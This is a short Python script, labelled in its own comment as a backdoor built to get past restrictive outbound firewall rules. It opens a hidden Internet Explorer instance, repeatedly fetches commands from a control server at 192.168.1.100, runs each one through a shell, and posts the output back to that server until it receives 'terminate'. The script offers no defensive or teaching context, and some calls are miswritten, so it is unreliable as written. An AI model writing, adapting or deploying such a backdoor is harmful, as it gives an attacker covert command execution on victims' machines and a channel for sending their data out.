#!usr/bin/python3
#this backdoor circumvents restrictive outbond firewall rules
from win32com.client import Dispatch
from time import sleep
import subprocess

ie = Dispatch("InternetExplorer.Application")
ie.Visible = 0

#parameters for post
durl = "http://192.168.1.100:80"
flags = 0
TargetFrame = ""

while True:
    ie.Navigate("http://192.168.1.100:80")
    while ie.Readystate != 4:
        sleep(1)


    command = ie.Document.body.innerHTML
    command = unicode(command)
    command = command.encode('ascii','ignore')

    if 'terminate' in command:
        ie.Quit()
        break

    else:
        CMD = subprocess.popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        Data = CMD.stdout.read()
        PostData = buffer(Data)
        ie.Navigate(durl,flags,TargetFrame,PostData)
        sleep(3)
